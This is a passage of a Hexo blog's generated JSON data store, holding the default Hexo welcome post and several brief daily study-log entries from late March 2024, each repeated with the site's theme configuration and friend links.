bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/writing.html\" >Writing<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/server.html\" >Server<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/generating.html\" >Generating<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/one-command-deployment.html\" >Deployment<i class=\"fas fa-external-link-alt\"></i></a></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","tags":"/tags || fa-solid fa-tags","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":" 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"excerpt":"","more":"<p>Welcome to <a class=\"link\"   href=\"https://hexo.io/\" >Hexo<i class=\"fas fa-external-link-alt\"></i></a>! This is your very first post. Check <a class=\"link\"   href=\"https://hexo.io/docs/\" >documentation<i class=\"fas fa-external-link-alt\"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class=\"link\"   href=\"https://hexo.io/docs/troubleshooting.html\" >troubleshooting<i class=\"fas fa-external-link-alt\"></i></a> or you can ask me on <a class=\"link\"   href=\"https://github.com/hexojs/hexo/issues\" >GitHub<i class=\"fas fa-external-link-alt\"></i></a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/writing.html\" >Writing<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/server.html\" >Server<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/generating.html\" >Generating<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/one-command-deployment.html\" >Deployment<i class=\"fas fa-external-link-alt\"></i></a></p>\n"},{"title":"03-26","date":"2024-03-26T13:55:14.000Z","excerpt":"","_content":"# 2024 3 26\n\n## \n\n- 4h\n\n## MATH\n\n- 1000\n\n## ENGLISH\n\n- \n\n## 408\n\n- \n\n\n\n## \n\n","source":"_posts/2024_3_26.md","raw":"---\ntitle: 03-26\ndate: 2024-03-26 21:55:14\nexcerpt: \ncategories: \n---\n# 2024 3 26\n\n## \n\n- 4h\n\n## MATH\n\n- 1000\n\n## ENGLISH\n\n- \n\n## 408\n\n- \n\n\n\n## \n\n","slug":"2024_3_26","published":1,"updated":"2024-04-12T14:13:45.143Z","_id":"cluwn76g70000oa769vu519gf","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-26\"><a href=\"#2024-3-26\" class=\"headerlink\" title=\"2024 3 26\"></a>2024 3 26</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>4h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>1000</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":" 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-26\"><a href=\"#2024-3-26\" class=\"headerlink\" title=\"2024 3 26\"></a>2024 3 26</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>4h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>1000</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n"},{"title":"03-27","date":"2024-03-27T13:15:34.000Z","excerpt":"","_content":"# 2024 3 27\n\n## \n\n- 5h\n\n## MATH\n\n- 1000 p63\n\n## ENGLISH\n\n- 42100+\n\n## 408\n\n- 16\n\n\n\n## \n\n12.301h\n\n\n\n\n\niie","source":"_posts/2024_3_27.md","raw":"---\ntitle: 03-27\ndate: 2024-03-27 21:15:34\nexcerpt: \ncategories: \n---\n# 2024 3 27\n\n## \n\n- 5h\n\n## MATH\n\n- 1000 p63\n\n## ENGLISH\n\n- 42100+\n\n## 408\n\n- 16\n\n\n\n## \n\n12.301h\n\n\n\n\n\niie","slug":"2024_3_27","published":1,"updated":"2024-04-12T14:13:57.175Z","_id":"cluwn76ge0001oa7631bpcafd","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024 3 27\"></a>2024 3 27</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>5h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>1000 p63</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>42100+</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>16</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>12.301h</p>\n<p></p>\n<p>iie</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":" 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024 3 27\"></a>2024 3 27</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>5h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>1000 p63</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>42100+</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>16</li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>12.301h</p>\n<p></p>\n<p>iie</p>\n"},{"title":"03-28","date":"2024-03-28T14:13:12.000Z","excerpt":"","_content":"# 2024 3 28\n\n## \n\n- 3h\n\n## MATH\n\n-  p67\n\n## ENGLISH\n\n- 20\n\n## 408\n\n- \n\n\n\n## \n\n","source":"_posts/2024_3_28.md","raw":"---\ntitle: 03-28\ndate: 2024-03-28 22:13:12\nexcerpt: \ncategories: \n---\n# 2024 3 28\n\n## \n\n- 3h\n\n## MATH\n\n-  p67\n\n## ENGLISH\n\n- 20\n\n## 408\n\n- \n\n\n\n## \n\n","slug":"2024_3_28","published":1,"updated":"2024-04-12T14:14:01.135Z","_id":"cluwn76gh0002oa76f63q14je","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-28\"><a href=\"#2024-3-28\" class=\"headerlink\" title=\"2024 3 28\"></a>2024 3 28</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>3h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p67</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>20</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":" 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-28\"><a href=\"#2024-3-28\" class=\"headerlink\" title=\"2024 3 28\"></a>2024 3 28</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>3h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p67</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>20</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n"},{"title":"03-29","date":"2024-03-29T13:12:45.000Z","excerpt":"","_content":"# 2024 3 29\n\n## \n\n- 0h\n\n## MATH\n\n- \n\n## ENGLISH\n\n- \n\n## 408\n\n- \n\n\n\n## \n\n","source":"_posts/2024_3_29.md","raw":"---\ntitle: 03-29\ndate: 2024-03-29 21:12:45\nexcerpt: \ncategories: \n---\n# 2024 3 29\n\n## \n\n- 0h\n\n## MATH\n\n- \n\n## ENGLISH\n\n- \n\n## 408\n\n- \n\n\n\n## \n\n","slug":"2024_3_29","published":1,"updated":"2024-04-12T14:14:09.136Z","_id":"cluwn76gj0003oa76gd3sfsek","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-29\"><a href=\"#2024-3-29\" class=\"headerlink\" title=\"2024 3 29\"></a>2024 3 29</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":" 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-29\"><a href=\"#2024-3-29\" class=\"headerlink\" title=\"2024 3 29\"></a>2024 3 29</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n"},{"title":"03-30","date":"2024-03-30T14:25:17.000Z","excerpt":"","_content":"# 2024 3 30\n\n## \n\n- 0h\n\n## MATH\n\n- \n\n## ENGLISH\n\n- \n\n## 408\n\n- \n\n\n\n## \n\n![2024-03-30 16.58.55](https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp)","source":"_posts/2024_3_30.md","raw":"---\ntitle: 03-30\ndate: 2024-03-30 22:25:17\nexcerpt: \ncategories: \n---\n# 2024 3 30\n\n## \n\n- 0h\n\n## MATH\n\n- \n\n## ENGLISH\n\n- \n\n## 408\n\n- \n\n\n\n## \n\n![2024-03-30 16.58.55](https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp)","slug":"2024_3_30","published":1,"updated":"2024-04-12T15:34:59.176Z","_id":"cluwn76gl0004oa76372ceptk","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-30\"><a href=\"#2024-3-30\" class=\"headerlink\" title=\"2024 3 30\"></a>2024 3 30</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp\"\n                        alt=\"2024-03-30 16.58.55\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":null},{"name":"","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-3-30\"><a href=\"#2024-3-30\" class=\"headerlink\" title=\"2024 3 30\"></a>2024 3 30</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp\"\n                        alt=\"2024-03-30 16.58.55\"\n                 ></p>\n"},{"title":"03-31","date":"2024-03-31T13:12:54.000Z","excerpt":"","_content":"# 2024 3 31\n\n## \n\n- 6h\n\n## MATH\n\n-  p85\n\n## ENGLISH\n\n- x\n\n## 408\n\n- \n\n\n\n## \n\n29\n\n","source":"_posts/2024_3_31.md","raw":"---\ntitle: 03-31\ndate: 2024-03-31 21:12:54\nexcerpt: \ncategories: \n---\n# 2024 3 31\n\n## \n\n- 6h\n\n## MATH\n\n-  p85\n\n## ENGLISH\n\n- x\n\n## 408\n\n- \n\n\n\n## \n\n29\n\n","slug":"2024_3_31","published":1,"updated":"2024-04-12T15:27:19.097Z","_id":"cluwn76gn0005oa76f64pcujp","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-31\"><a href=\"#2024-3-31\" class=\"headerlink\" title=\"2024 3 31\"></a>2024 3 31</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>6h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p85</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>29</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":null},{"name":"","link":"https://fushuling.com/","avatar":null}]}},"more":"<h1 id=\"2024-3-31\"><a href=\"#2024-3-31\" class=\"headerlink\" title=\"2024 3 31\"></a>2024 3 31</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><ul>\n<li>6h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li> p85</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>x</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" 